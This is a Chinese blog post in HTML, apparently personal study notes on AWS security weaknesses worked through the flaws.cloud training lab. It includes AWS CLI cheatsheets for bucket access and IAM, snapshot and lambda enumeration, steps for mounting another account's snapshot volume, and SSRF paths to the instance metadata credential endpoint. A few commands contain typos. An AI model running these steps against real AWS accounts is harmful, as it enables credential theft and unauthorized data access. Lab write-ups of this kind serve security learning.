@@ -1,0 +1,270 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>AWS 常见安全问题总结（一） | 持剑</title>
+<meta name="description" content="碎月星辰揽江风 , 我心有剑问天涯 ">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://1dayluo.github.io/favicon.ico?v=1711284755357">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://1dayluo.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://1dayluo.github.io">
+        <img class="avatar" src="https://1dayluo.github.io/images/avatar.png?v=1711284755357" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://1dayluo.github.io">
+        <h1 class="site-title">持剑</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">AWS 常见安全问题总结（一）</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2024-03-24</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://1dayluo.github.io/tag/GmwpzpyDi/">
+                    云安全
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://1dayluo.github.io/tag/5CW47rOjA1/">
+                    学习笔记
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content" v-pre>
+            <h2 id="s3常见的安全问题">S3常见的安全问题</h2>
+<h3 id="安全问题概括">安全问题概括</h3>
+<p>概括如下：</p>
+<ol>
+<li>s3桶名为全局变量，默认是aws上任意两个用户不能有重名s3桶变量名。如一域名负载在s3，则可以通过 <code>&lt;s3-name&gt;.&lt;hostname&gt;</code> 访问</li>
+<li>S3配置IAM下， <code>Everyone</code> 意味着所有互联网上所有人。而不是，自己aws账户下的所有人，此外还有 <code>Any Authenticated AWS User</code> ，意味着所有有aws账户的人。后者web页面不支持，但是仍然可以通过SDK和第三方工具配置。</li>
+</ol>
+<h3 id="命令cheatsheet">命令cheatsheet</h3>
+<ol>
+<li>aws同步下载文件到本地</li>
+</ol>
+<pre><code class="language-bash">aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2
+</code></pre>
+<ol>
+<li>配置新的access_key 和 secret_access_key (以靶场flaws的level3为例子）</li>
+</ol>
+<pre><code class="language-bash">aws configure --profile flawslevel3
+</code></pre>
+<p>查看对应的profile下的资产内容</p>
+<pre><code class="language-bash"> aws s3 ls --profile flawslevel3
+</code></pre>
+<h2 id="ec2常见安全问题">EC2常见安全问题</h2>
+<p>常见概念：</p>
+<ul>
+<li>STS(Security Token Service) ：控制不同aws的安全控制
+<ul>
+<li>GetCallerIdentity: 显示账户可被控制的api <strong>这个操作不需要任何权限</strong>，即使管理员将拒绝访问：  <code>aws sts get-caller-identity --profile flawslevel3</code></li>
+</ul>
+</li>
+<li>snapshot 快照：快照是 Amazon 特有的东西，可让您在帐户之间传输卷上的数据。它们是从卷（volume）创建的“只读”备份</li>
+<li>aws_session_token： 除了<code>access_key</code> 和 <code>secret_access_key</code> 会泄漏外，也有token泄漏的场景。需要一并加入到~/.aws/credentials下，添加 <code>aws_session_token = ..</code></li>
+</ul>
+<h3 id="安全问题概述">安全问题概述：</h3>
+<ol>
+<li>泄漏 <code>access_key</code> 和 <code>secret_access_key</code>, 利用方式，通过aws cli进一步获取更多信息和提权。</li>
+<li>快照记录了volume的信息，并且可以绕过ec2密码，来利用快照访问ec2示例。这就导致了黑客可以利用快照来获取volume信息，并结合aws创建volumn的权限（<code>createVolumePermission</code>） 将受害者volume挂载到攻击者的EC2示例上（需要确保region一致）。从而获取到ec2上的内容。（需要结合第1点来利用）</li>
+<li>ssrf漏洞，导致可以利用 <code>169.254.169.254</code> 获取meta-data。（AWS在IMDSv2下，设立了特定的header，但IMDSv2并非默认强制）关于IMDSv1的问题看这篇<a href="https://kishoreramk.medium.com/securing-aws-understanding-ec2-imds-vulnerabilities-and-learning-from-the-capital-one-breach-6f753e06cd66">文章</a>
+<ol>
+<li>169.254.169.254/latest/meta-data/iam/security-credentials/flaws</li>
+<li>169.254.169.254/latest/meta-data/iam/info</li>
+<li>169.254.169.254/latest/meta-data/iam/</li>
+</ol>
+</li>
+<li><code>SecurityAudit</code> 权限</li>
+</ol>
+<h3 id="cheatsheet">cheatsheet</h3>
+<ol>
+<li>显示全部STS（Security Token Service)</li>
+</ol>
+<pre><code class="language-bash">aws sts get-caller-identity --profile flawslevel3 
+</code></pre>
+<ol>
+<li>显示ec2实例密钥对（需要提前profile配好region）</li>
+</ol>
+<pre><code class="language-bash">aws  --profile flawslevel3 ec2  describe-key-pairs
+</code></pre>
+<ol>
+<li>检查属于用户id为指定id(这里为975426262029）下的快照</li>
+</ol>
+<pre><code class="language-bash">aws ec2 describe-snapshots --owner-id 975426262029 --profile flawslevel3
+</code></pre>
+<ol>
+<li>查看指定快照id的 <code>createVolumePermission</code> 权限</li>
+</ol>
+<pre><code class="language-bash">aws ec2 describe-snapshot-attribute --snapshot-id snap-0b49342abd1bdcb89 --attribute createVolumePermission --profile flawslevel3
+</code></pre>
+<ol>
+<li>volume绑定ec2 instance &amp; 进一步的利用</li>
+</ol>
+<pre><code class="language-bash">aws ec2 attach-volume —-volume-id vol-randnum --instance-id i-randnum —-device /dev/sdf —-region us-west-2
+</code></pre>
+<p>进一步利用所需命令补充（待后续优化笔记）：</p>
+<p>Download the key pair and SSH into it. change the permission of downloaded pem file. <code>ssh -i YOUR_KEY.pem ubuntu@ec2-54-191-240-80.us-west-2.compute.amazonaws.com</code></p>
+<p>First list information about all available block devices using <code>lsblk.</code> <code>xvda1</code> is our available volume.</p>
+<p>view drive information: <code>sudo file -s /dev/xvdf1</code></p>
+<p>Mount drive: <code>sudo mount /dev/xvdf1 /mnt</code></p>
+<h2 id="iam常见安全问题">IAM常见安全问题</h2>
+<ol>
+<li><code>SecurityAudit</code> 的policy能够帮助黑客去读区你或别的iam信息，然后寻找薄弱点</li>
+</ol>
+<h3 id="cheatsheet-2">cheatsheet</h3>
+<p>policy精确查询：</p>
+<p>列出当前用户iam信息：创建时间，路径，unique id，arn</p>
+<pre><code class="language-bash">aws --profile level6 iam get-user
+</code></pre>
+<p>List attached-user-policies attached to user ( <code>{username}</code> 为get-user获取到的用户名）</p>
+<pre><code class="language-bash">aws --profile level6 iam list-attached-user-policies --username {username}
+</code></pre>
+<p>list-users</p>
+<pre><code class="language-bash">aws iam list-users --profile level6
+</code></pre>
+<p>list policies（这里会有arn的信息）</p>
+<pre><code class="language-bash">aws iam list-policies --profile level6
+</code></pre>
+<p>根据arn信息和version id，来查看具体policy信息 （这里arn-id为list-attached-user-policies命令下的）</p>
+<pre><code class="language-bash">aws --profile level6 iam get-policy-version --policy-arn {arn-id} --version-id v4
+</code></pre>
+<p>lambda的精确查询：</p>
+<p>查找有哪些lambda 这一步可以获取到lambda函数名</p>
+<pre><code class="language-bash">aws --region us-west-2 --profile level6 list-funtions
+</code></pre>
+<p>查看对应函数名的policy信息</p>
+<pre><code class="language-bash">aws --region us-west-2 --profile level6 lambda get-policy --function-name {func-name}
+</code></pre>
+<p>这一步可以获取到rest-api-id ，然后访问 <a href="https://api-id.execute-api.us-east-2.amazonaws.com/"><code>https://api-id.execute-api.us-east-2.amazonaws.com</code></a></p>
+<h2 id="学习文章">学习文章：</h2>
+<ul>
+<li><a href="https://kishoreramk.medium.com/hacking-aws-flaws-cloud-walkthrough-2f13083b0b4d">https://kishoreramk.medium.com/hacking-aws-flaws-cloud-walkthrough-2f13083b0b4d</a></li>
+<li><a href="https://kishoreramk.medium.com/securing-aws-understanding-ec2-imds-vulnerabilities-and-learning-from-the-capital-one-breach-6f753e06cd66">https://kishoreramk.medium.com/securing-aws-understanding-ec2-imds-vulnerabilities-and-learning-from-the-capital-one-breach-6f753e06cd66</a></li>
+</ul>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://1dayluo.github.io/post/spring-ji-chu-gai-nian-bi-ji/">
+              <h3 class="post-title">
+                下一篇：spring 基础概念笔记
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">碎月星辰揽江风 , 我心有剑问天涯 </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+   | <a class="rss" href="https://1dayluo.github.io/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
